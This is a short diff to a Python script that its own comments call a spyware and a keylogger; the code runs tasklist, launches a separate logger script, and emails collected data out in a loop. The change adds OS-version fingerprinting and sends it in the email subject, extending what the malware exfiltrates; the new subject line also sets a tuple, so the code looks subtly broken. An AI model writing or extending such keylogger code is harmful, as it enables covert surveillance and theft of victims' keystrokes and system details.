@@ -16,6 +16,7 @@ import subprocess
 import time
 import simplejson
 import re
+import platform
 
 # Call la tasklist et l'enregistre dans output.txt
 tasklist = os.system("tasklist")
@@ -32,6 +33,7 @@ os.system('Logger.pyw')
 #    if key == Key.esc:
 #        return False
 
+osver = platform.platform()
 
 # Fin du spyware
 while True
@@ -45,7 +47,7 @@ while True
     msg = MIMEMultipart()
     msg['From'] = email_user
     msg['To'] = email_send
-    msg['Subject'] = subject
+    msg['Subject'] = subject, osver
 
     body = 'Python Keylogger réponse.'
     msg.attach(MIMEText(body, 'plain'))
